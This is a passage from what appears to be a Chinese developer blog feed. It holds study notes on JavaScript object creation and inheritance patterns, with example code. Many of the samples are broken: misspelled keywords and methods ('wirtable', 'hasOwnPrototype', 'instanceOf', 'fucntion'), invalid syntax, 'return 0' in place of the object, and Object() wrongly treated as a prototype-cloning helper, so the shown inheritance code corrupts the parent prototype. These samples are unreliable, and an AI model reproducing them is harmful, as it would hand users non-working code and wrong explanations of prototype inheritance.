class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;&#125;;</span><br><span class="line">Object.defineProperty(book,&#123;</span><br><span class="line">    _year: &#123;</span><br><span class="line">        writable: true,</span><br><span class="line">        value: 2004</span><br><span class="line">    &#125;,</span><br><span class="line">    edition: &#123;</span><br><span class="line">        wirtable: true,</span><br><span class="line">        value: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="读取属性的特性"><a href="#读取属性的特性" class="headerlink" title="读取属性的特性"></a>读取属性的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);</span><br><span class="line">alert(descriptor.value);  //2004</span><br><span class="line">alert(descriptor.configurable);   //false</span><br><span class="line">alert(typeof descriptor.get);    //&quot;undefined&quot;</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>抽象了创建具体对象的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.age = age;</span><br><span class="line">    o.job = job;</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br><span class="line"></span><br><span class="line">// 使用call实现在特殊作用于中调用Person函数</span><br><span class="line">var o = new Object();</span><br><span class="line">Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);</span><br><span class="line">o.sayName();   //&quot;Kristen&quot;</span><br></pre></td></tr></table></figure><p>此方法特点：</p><ul><li>没有显示地创建对象</li><li>直接将属性方法赋给了his对象</li><li>没有return语句</li><li>不同实例上的同名函数每次都是新创建初始化，他们之间不相等<br>最好将函数定义转移到构造函数外</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = sayName;</span><br><span class="line">&#125;</span><br><span class="line">function sayName()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br></pre></td></tr></table></figure><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><p>创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.name = &quot;Nicholas&quot;;</span><br><span class="line">Person.prototype.age = 29;</span><br><span class="line">Person.prototype.job = &quot;Software Engineer&quot;;</span><br><span class="line">Person.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">person1.sayName();   //&quot;Nicholas&quot;,来自原型</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324153411.png" alt="Alt text"></p><p>可以通过isPrototypeOf来确定对象之间是否存在这种关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Person.prototype.isPrototypeOf(person1));   //true</span><br><span class="line">alert(Person.getPrototypeOf(person) == Person.prototype);   //true</span><br><span class="line">alert(Obeject.getPrototypeOf(person1).name);   //&quot;Nicholas&quot;</span><br></pre></td></tr></table></figure><p>可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br><span class="line">person1.name = &quot;Greg&quot;;</span><br><span class="line">alert(person1.name);   //&quot;Greg&quot;,来自实例</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //true</span><br><span class="line">delete person1.name;</span><br><span class="line">alert(person1.name);   //&quot;Nicholas&quot;,来自原型</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br></pre></td></tr></table></figure><p>in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;name&quot; in person1);   //true</span><br></pre></td></tr></table></figure><p>for-in循环，返回的是所有能够通过对象访问、可枚举的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    toString: function()&#123;</span><br><span class="line">        return &quot;My Object&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">for(var prop in o)&#123;</span><br><span class="line">    if(pop == &quot;toString&quot;)&#123;</span><br><span class="line">        alert(&quot;Found toString&quot;);   //IE中不会显示，认为原型中的toString被屏蔽</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Object.key可以取得所有可枚举的实力属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var keys = Object.keys(Person.prototype);</span><br><span class="line">alert(keys);   //&quot;name,age,job,sayName&quot;</span><br><span class="line">var p1 = new Person();</span><br><span class="line">p1.name = &quot;Rob&quot;;</span><br><span class="line">p1.age = 31;</span><br><span class="line">var p1Keys = Object.keys(p1);</span><br><span class="line">alert(p1Keys);   //&quot;name,age&quot;</span><br></pre></td></tr></table></figure><p>更简单的原型创建语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person</span><br></pre></td></tr></table></figure><p>对原型对象所做的修改可以立即从实例上反映出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype.sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br><span class="line">friends.sayHi();   //&quot;Hi&quot;</span><br></pre></td></tr></table></figure><p>但重写整个原型对象就不可以了，此时constructor指向新创建的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">friends.sayName();   //error</span><br></pre></td></tr></table></figure><p>通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.startsWith = function(text)&#123;</span><br><span class="line">    return this.indexOf(text) == 0;</span><br><span class="line">&#125;;</span><br><span class="line">var msg = &quot;Hello world&quot;;</span><br><span class="line">alert(msg.startsWith(&quot;Hello&quot;));   //true</span><br></pre></td></tr></table></figure><p>原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组</p><h3 id="组合使用构造函数和原型模式"><a href="#组合使用构造函数和原型模式" class="headerlink" title="组合使用构造函数和原型模式"></a>组合使用构造函数和原型模式</h3><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);</span><br><span class="line">var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);</span><br><span class="line">person1.friends.push(&quot;Van&quot;);</span><br><span class="line">alert(person1.friends);   //&quot;Shelly,Court,Van&quot;</span><br><span class="line">alert(person2.friends);   //&quot;Shelly,Court&quot;</span><br></pre></td></tr></table></figure><h3 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h3><p>通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    if(typeof this.sayName != &quot;function&quot;)&#123;</span><br><span class="line">        Person.prototype.sayName = function()&#123;</span><br><span class="line">            alert(this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生构造函数模式"><a href="#寄生构造函数模式" class="headerlink" title="寄生构造函数模式"></a>寄生构造函数模式</h3><p>该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function SpecialArray()&#123;</span><br><span class="line">    var values = new Array();</span><br><span class="line">    values.push.apply(values,arguments);</span><br><span class="line">    values.toPipedString = function()&#123;</span><br><span class="line">        return this.join(&quot;|);</span><br><span class="line">    &#125;;</span><br><span class="line">    return values;</span><br><span class="line">&#125;</span><br><span class="line">var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);</span><br><span class="line">alert(colors.toPipedString());    //&quot;red|blue|green&quot;</span><br></pre></td></tr></table></figure><h3 id="稳妥构造函数模式"><a href="#稳妥构造函数模式" class="headerlink" title="稳妥构造函数模式"></a>稳妥构造函数模式</h3><p>稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(name);    //name只能通过sayName方法访问</span><br><span class="line">    &#125;;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>实现原型链的基本模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.property = true;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class="line">    return this.property;</span><br><span class="line">&#125;;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    this.subproperty = false;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();</span><br><span class="line">SubType.prototype.getSubValue = function()&#123;</span><br><span class="line">    return this.subproperty;</span><br><span class="line">&#125;;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.getSuperValue());   //true</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324225152.png" alt="Alt text"></p><p>以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(instance instanceOf Object);   //true</span><br><span class="line">alert(instance instanceOf SuperType);   //true</span><br><span class="line">alert(instance instanceOf SubType);   //true</span><br><span class="line">alert(Object.prototype.isPrototypeOf(instance));   //true</span><br></pre></td></tr></table></figure><p>通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享</p><h3 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this);   //执行了SuperType中定义的所有对象初始化代码</span><br><span class="line">&#125;</span><br><span class="line">var instance1 = new SubType();</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">var instance2 = new SubType();</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line"></span><br><span class="line">// 还可以传递参数</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this,&quot;Nicholas&quot;);</span><br><span class="line">    this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.name);   //&quot;Nicholas&quot;</span><br><span class="line">alert(instance.age);   //29</span><br></pre></td></tr></table></figure><p>如同仅仅借用构造函数，则无法函数复用</p><h3 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h3><p>使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this,name);    //继承属性</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();   //继承方法</span><br><span class="line">SubType.prototype.constructor = SubType;</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br><span class="line">var instance1 = new SubType(&quot;Nicholas&quot;,29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName();   //&quot;Nicholas&quot;</span><br><span class="line">instance1.sayAge();   //29</span><br><span class="line">var instance2 = new SubType(&quot;Greg&quot;,27);</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName();   //&quot;Greg&quot;</span><br><span class="line">instance2.sayAge();   //27</span><br></pre></td></tr></table></figure><h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson  Object(person);</span><br><span class="line">anotherPerson.name = &quot;Greg&quot;;</span><br><span class="line">anotherPerson.friends.push(&quot;Rob&quot;);</span><br><span class="line">var getAnotherPerson = Object(person);</span><br><span class="line">getAnotherPerson.name = &quot;Linda&quot;;</span><br><span class="line">getAnotherPerson.friends.push(&quot;Barbie&quot;);</span><br><span class="line">alert(person.friends);   //&quot;Shelby,Court,Van,Rob,Barbie&quot;</span><br></pre></td></tr></table></figure><p>ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson = Object.create(person,&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        value: &quot;Greg&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">alert(anotherPerson.name);   //&quot;Greg&quot;</span><br></pre></td></tr></table></figure><h3 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h3><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123;</span><br><span class="line">    var clone = Object(original);   //创建一个新对象，Object函数不是必需的</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        alert(&quot;Hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    return clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生组合继承"><a href="#寄生组合继承" class="headerlink" title="寄生组合继承"></a>寄生组合继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fucntion inheritP(subType,superType)&#123;</span><br><span class="line">    var prototype = Object(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this.name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">inheritP(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;属性类型&quot;&gt;&lt;a href=&quot;#属性类型&quot; class=&quot;headerlink&quot; title=&quot;属性类型&quot;&gt;&lt;/a&gt;属性类型&lt;/h2&gt;&lt;h3 id=&quot;数据属性&quot;&gt;&lt;a href=&quot;#数据属性&quot; class=&quot;headerlink&quot; title=&quot;数据属性&quot;&gt;&lt;/a&gt;数据属性&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;属性名&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Configurable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过delete删除属性从而重新定义属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Enumerable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过for-in循环返回属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Writable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否修改属性的值，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Value]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;包含这个属性的数值，默认为undefined&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Object.defineProperty(person,&amp;quot;name&amp;quot;,&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    writable: false,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    value: &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.name = &amp;quot;Greg&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;,通过修改属性使之不能被修改&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>HTTP原理</title>
    <link href="http://dangoying.ink/HTTP%E5%8E%9F%E7%90%86.html"/>
    <id>http://dangoying.ink/HTTP原理.html</id>
    <published>2019-01-17T14:03:18.000Z</published>
